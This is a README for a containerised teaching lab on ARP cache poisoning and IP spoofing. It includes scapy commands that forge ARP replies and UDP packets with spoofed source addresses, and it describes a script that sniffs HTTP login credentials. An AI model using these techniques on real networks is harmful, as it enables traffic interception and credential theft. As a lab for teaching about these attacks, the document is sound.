[![CC BY-SA 4.0][cc-by-sa-shield]][cc-by-sa]

# ARP Cache Poisoning & IP Spoofing Lab

This repository contains a minimal lab setup for demoing ARP cache poisoning and IP spoofing.

- [Wikipedia: ARP Spoofing](https://en.wikipedia.org/wiki/ARP_spoofing)
- [Wikipedia: IP Spoofing](https://en.wikipedia.org/wiki/IP_address_spoofing)

> The code contained in this repository is intentionally **INSECURE** and must **NOT** be used in production!

## License

This work is licensed under a
[Creative Commons Attribution-ShareAlike 4.0 International License][cc-by-sa].

[![CC BY-SA 4.0][cc-by-sa-image]][cc-by-sa]

[cc-by-sa]: http://creativecommons.org/licenses/by-sa/4.0/
[cc-by-sa-image]: https://licensebuttons.net/l/by-sa/4.0/88x31.png
[cc-by-sa-shield]: https://img.shields.io/badge/License-CC%20BY--SA%204.0-lightgrey.svg

## Setup

- Install `docker` (and `docker-compose` if your Docker does not support `compose` directly)
- Clone this repo
- Run `docker-compose build --pull` to pull and build the images

You get three images for

- `victim`
- `attacker`
- `udpserv`

that are used by the containers described in the next section.

After the images are built, run the containers via the command:

```bash
$ docker-compose up -d
[+] Running 0/4
 ⠋ Container alice    Creating
 ⠋ Container evie     Creating
 ⠋ Container bob      Creating
 ⠋ Container udpserv  Creating
 ...
```

> For accessing the containers, refer to the section at the end of this document.

If you need to explicitly rebuild the images use `docker-compose up -d --build`.

## Configuration

There are three containers based on two images

| Name      | IP address  | MAC address       | Role            | Service         |
| --------- | ----------- | ----------------- | --------------- | --------------- |
| `alice`   | 10.10.0.101 | 00:00:00:00:00:01 | Victim          | 80/tcp (http)   |
| `bob`     | 10.10.0.102 | 00:00:00:00:00:02 | Victim          | 80/tcp (http)   |
| `evie`    | 10.10.0.103 | 00:00:00:00:00:03 | Attacker        | -               |
| `udpserv` | 10.10.0.104 | 00:00:00:00:00:04 | UDP Echo Server | 9999/udp (echo) |

## Manual ARP Cache Poisoning

Tell `alice` that the ip address of `bob` resides at `evie's` mac address.

```python
$ scapy
...
>>> a = ARP()                      # create an ARP packet
>>> a.show()                       # have a look at the ARP packet
>>> a.op = 'is-at'                 # Unsolicited ARP
>>> a.pdst = '10.10.0.101'         # L3-Dst: Alice
>>> a.psrc = '10.10.0.102'         # L3-Src: Bob
>>> a.hwdst = '00:00:00:00:00:01'  # L2-Dst: Alice
>>> a.hwsrc = '00:00:00:00:00:03'  # L2-Src: Evie
>>> a.show()                       # check the values again
>>> send(a)                        # send the Packet (on L3, for convenience)
>>> ...
```

During the attack, monitor the system's ARP cache for changes via

```bash
$ watch -d -n1 "ip neigh show"
Every 1.0s: ip neigh show

10.10.0.102 dev eth0 lladdr 00:00:00:00:00:02 REACHABLE
...
```

If the attack was successful you should be able to see the MAC address of `bob's` ip changing to `evie's` MAC address.

> `watch` executes the command `ip neigh show` (show ARP cache) every second (`-n1`) and highlights changes (`-d`).

> Sometimes the ARP cache does not get overwritten immediately - so try another time if there is no success.

## Automatic ARP Cache Poisoning

> Notes for `spoofing.py`:
>
> - Reports captured HTTP data twice (incoming and outgoing - needs filtering)
> - Sometimes packets are not captured

To start the automatic ARP cache poisoning, run on `evie`:

```bash
$ python3 spoofing.py
... # wait for output
```

and let a client do an HTTP request (on `alice`):

```bash
# HTTP GET
$ curl "http://bob/login?user=myuser&pass=mysecret"
...
# HTTP POST
$ curl "http://bob/login" --data "user=myuser&pass=mysecret"
...
```

## Manual IP Spoofing

For the IP spoofing we use a echo server that just returns the request-data 10 times to the address contained in the IP-packet's `source` field.

> To check if the UDP Echo server is running you can `nc -u 10.10.0.104 9999` from any other machine in this lab setup and send some arbitrary data. You should receive 10-times your request.

On the attacker (`evie`) create a packet that is addressed to the echo server and contains e.g. `alice's` IP address in the `src`-field.

```python
$ scapy
...
# Create a IP/UDP/Data-Packet and send it via L3 to the Server
>>> send(IP(dst='10.10.0.104', src='10.10.0.101')/UDP(dport=9999)/Raw(load="abc"))
...
```

Monitor the incoming UDP data on `alice` using:

```bash
$ tcpdump -i eth0 -X udp
...
15:21:59.013318 IP udpserv.arplab_lab-net.9999 > alice.53: 24930 updateM+ [b2&3=0x6361] [24930a] [25187q] [25441n] [25187au] [|domain]
	0x0000:  4500 003a 6ed3 4000 4011 b6ff 0a0a 0068  E..:n.@.@......h
	0x0010:  0a0a 0065 270f 0035 0026 1518 6162 6361  ...e'..5.&..abca
	0x0020:  6263 6162 6361 6263 6162 6361 6263 6162  bcabcabcabcabcab
	0x0030:  6361 6263 6162 6361 6263                 cabcabcabc
...
```

## Common docker commands

### Control containers

```bash
# Bring containers up
$ docker compose up -d
# Show logs of all containers
$ docker compose logs -f
# Bring all containers down
$ docker compose down
...
```

### List running containers

```bash
$ docker ps
CONTAINER ID   IMAGE          COMMAND               CREATED         STATUS         PORTS     NAMES
<id>           victim:1.0     "python3 app.py"      4 seconds ago   Up 2 seconds             alice
<id>           udpserv:1.0    "python3 server.py"   4 seconds ago   Up 2 seconds             udpserv
<id>           victim:1.0     "python3 app.py"      4 seconds ago   Up 2 seconds             bob
<id>           attacker:1.0   "/bin/sh"             4 seconds ago   Up 2 seconds             evie
```

### Accessing a containers shell

Start a shell in one of the containers (by name of the container):

```bash
$ docker exec -it evie /bin/bash
root@evie:/#
```
